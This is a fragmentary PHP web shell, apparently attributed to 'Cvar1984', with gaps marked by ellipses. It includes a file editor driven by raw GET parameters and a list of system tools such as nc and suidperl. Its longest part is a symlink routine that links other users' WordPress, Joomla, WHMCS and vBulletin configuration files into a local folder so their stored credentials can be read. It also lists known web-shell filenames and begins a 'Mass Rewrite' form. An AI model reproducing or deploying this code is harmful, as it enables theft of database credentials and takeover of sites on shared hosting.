...
function edit_file() {
    $path=$_GET['path'];
    chdir($path);
    $edt_file=$_GET['edit']; $e_content=wordwrap(htmlspecialchars(file_get_contents($edt_file)));
    if($e_content) {
        $o_content=$e_content;
...
echo "<div id='result'>
	...
	<font color=red>View File</font> : <font color=yellow><a style='text-decoration:none; color:yellow;' href='?read=".$_GET['edit']."'>". 
basename($_GET['edit'])  ."</a><br /><br /><hr><br></font>
...
<font color=#999><a style='text-decoration:none; color:yellow;' href='?path={$path}&amp;edit=".$_GET['read']."'>". 
basename($_GET['read'])  ."</a></font><br><br><hr><pre><code>".$rr_content."</code></pre>
<br><br><hr><br><br></div>";
}
...
value=0".substr(sprintf('%o', fileperms($p_file)),
-3)."><input type='submit' value=' O'
...
-a')."</pre></td></tr>";
$useful=array(
'gcc','lcc','cc','ld','make','php','perl','python',
'ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
              $uze=array();
...
symlink(
'/home/'.$usernamexx.'/public_html/vb/includes/config.php','Cvar1984/'.$domainxx.'
=>vBulletin1.txt');
...
function symlinggg($user) {
    symlink('/home/'.$usernamexx.'/public_html/blog/configuration.php',
"Cvar1984/".$user." =>blog/configuration.php");
    symlink('/home/'.$user.'/public_html/forum/includes/config.php',
"Cvar1984/".$user." =>forum/includes/config.php");
   
symlink("/home/".$user."/public_html/wp-config.php",
"Cvar1984/".$user." =>wp-config.php");
   
symlink("/home/".$user."/public_html/wordpress/wp-config.php",
"Cvar1984/".$user." =>wordpress/wp-config.php");
   
symlink("/home/".$user."/public_html/configuration.php",
"Cvar1984/".$user." =>configuration.php");
   
symlink("/home/".$user."/public_html/blog/wp-config.php",
"Cvar1984/".$user." =>blog/wp-config.php");
   
symlink("/home/".$user."/public_html/joomla/configuration.php",
"Cvar1984/".$user." =>joomla/configuration.php");
   
symlink("/home/".$user."/public_html/vb/includes/config.php",
"Cvar1984/".$user." =>vb/includes/config.php");
   
symlink("/home/".$user."/public_html/includes/config.php",
"Cvar1984/".$user." =>includes/config.php");
   
symlink("/home/".$user."/public_html/conf_global.php",
"Cvar1984/".$user." =>conf_global.php");
   
symlink("/home/".$user."/public_html/inc/config.php",
"Cvar1984/".$user." =>inc/config.php");
    symlink("/home/".$user."/public_html/config.php",
"Cvar1984/".$user." =>config.php");
   
symlink("/home/".$user."/public_html/Settings.php",
"Cvar1984/".$user." =>/Settings.php");
   
symlink("/home/".$user."/public_html/sites/default/settings.php",
"Cvar1984/".$user." =>sites/default/settings.php");
   
symlink("/home/".$user."/public_html/whm/configuration.php",
"Cvar1984/".$user." =>whm/configuration.php");
   
symlink("/home/".$user."/public_html/whmcs/configuration.php",
"Cvar1984/".$user." =>whmcs/configuration.php");
   
symlink("/home/".$user."/public_html/support/configuration.php",
"Cvar1984/".$user." =>support/configuration.php");
   
symlink("/home/".$user."/public_html/whmc/WHM/configuration.php",
"Cvar1984/".$user." =>whmc/WHM/configuration.php");
...
symlink("/home/".$user."/public_html/clients/configuration.php",
"Cvar1984/".$user." =>clients/configuration.php");
   
symlink("/home/".$user."/public_html/client/configuration.php",
"Cvar1984/".$user." =>client/configuration.php");
   
symlink("/home/".$user."/public_html/clientes/configuration.php",
"Cvar1984/".$user." =>clientes/configuration.php");
   
symlink("/home/".$user."/public_html/cliente/configuration.php",
"Cvar1984/".$user." =>cliente/configuration.php");
   
symlink("/home/".$user."/public_html/clientsupport/configuration.php",
"Cvar1984/".$user."
=>clientsupport/configuration.php");
   
symlink("/home/".$user."/public_html/billing/configuration.php",
"Cvar1984/".$user." =>billing/configuration.php");
   
symlink("/home/".$user."/public_html/admin/config.php",
"Cvar1984/".$user." =>admin/config.php");
}
function sym_xxx() {
    global $sym_htaccess,$sym_php_ini;
    mkdir('Cvar1984', 0777);
...
class='table'>";
$ShellZ=array(
"x.jpg.php","indoXploit.php","x.php","ini.php","c99.php",
"c100.php","r57.php","b374k.php","c22.php","sym.php",
"adminer.php","r00t.php","webr00t.php",
"sql.php","cpanel.php", "wso.php",
"404.php", "aarya.php", "yellowshell.php",
"ddos.php", "madspot.php", "1337.php",
"31337.php", "WSO.php", "dz.php",
"cpn.php", "sh3ll.php", "mysql.php",
"killer.php", "cgishell.pl", "dz0.php",
"whcms.php", "vb.php", "gaza.php",
"d0mains.php", "changeall.php", "h4x0r.php",
"L3b.php", "uploads.php", "shell.asp",
"cmd.asp", "sh3ll.asp", "b374k-2.2.php",
"m1n1.php", "b374km1n1.php");
...
color=red>$ppp$sep$c_file</font></td></tr>";
    ...
    ?>
        <div id=result><center><h2>Mass Rewrite</h2></center><hr><br><br><table class=table><form method='POST'><input type='hidden' name='path' value="<?php echo getcwd();
?>"><tr><td>Mode : </td>
